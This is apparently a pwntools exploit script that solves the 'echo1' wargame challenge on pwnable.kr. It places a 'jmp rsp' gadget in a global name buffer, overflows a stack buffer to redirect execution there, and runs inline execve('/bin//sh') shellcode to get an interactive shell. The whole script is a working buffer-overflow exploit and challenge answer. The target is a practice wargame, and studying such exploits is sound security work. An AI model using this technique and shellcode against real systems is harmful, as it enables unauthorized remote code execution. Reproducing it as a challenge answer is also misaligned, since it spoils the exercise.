from pwn import*
#p = process('./echo1')
p = remote('pwnable.kr', 9010)

context.arch = 'amd64'
t = 0.1
# gadget
target = 0x6020A0
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
shellcode += "\x2f\x2f\x73\x68\x56\x53\x54\x5f"
shellcode += "\x6a\x3b\x58\x31\xd2\x0f\x05\x90"

# exploit
p.recvuntil("hey, what's your name? : ")
p.sendline(asm('jmp rsp'))	# name
sleep(t)
p.sendline('1')			# bof
sleep(t)

pay = ''
pay += 'a'*0x20
pay += 'b'*0x8
pay += p64(target)		# id_addr
pay += shellcode		# shellcode
p.sendline(pay)
sleep(t)

p.interactive()
